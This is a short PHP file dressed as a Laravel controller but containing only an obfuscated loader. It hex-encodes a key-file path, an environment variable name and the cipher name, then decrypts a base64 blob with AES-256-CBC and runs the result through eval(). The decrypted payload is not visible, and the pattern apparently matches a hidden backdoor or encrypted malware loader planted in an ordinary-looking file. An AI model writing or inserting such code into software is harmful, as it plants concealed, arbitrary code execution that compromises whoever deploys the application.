<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('a7qVgqDdy/yyc6QFzcxfyg==');

$c=base64_decode(

'Lft1BGAp0LmiSCVcOnS2o9gE5wQd0sjXppj1URuA12UBOFTOhDKntgfkpM5dPBZOoBiYb9udChBn' .
'W559Mvbj6kP/c+o+xdrAu4eo/gBm8WkJDfSlBy8WSiIQn801nxrZ+Q0YN8jcNHPF5RShvl9qaNrx' .
'UDrCLfb3ad3RHnFZt1wP4AsB4VgIpp5ZP1CO96XYQl6SVoaHrUo5rQZbzIs9AfWcc+N3vdbJwXUs' .
'N8NvlPpAoaxMkvBwC1BGK6x6aRL4WyGqKtB+I0Z5wkfODRHtCRhlloAdy+z+xd0kUrNFA3CaKMKI' .
'7X0XnHUlCbgLErhSzw1OHGeXN/oVLQAC4OT02wa8dchyC0D4r0sy1P96q5eceIiFKKlL8mlRjq6m' .
'kT6JZle6Aa0sf10DJWXdVjNTAg=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

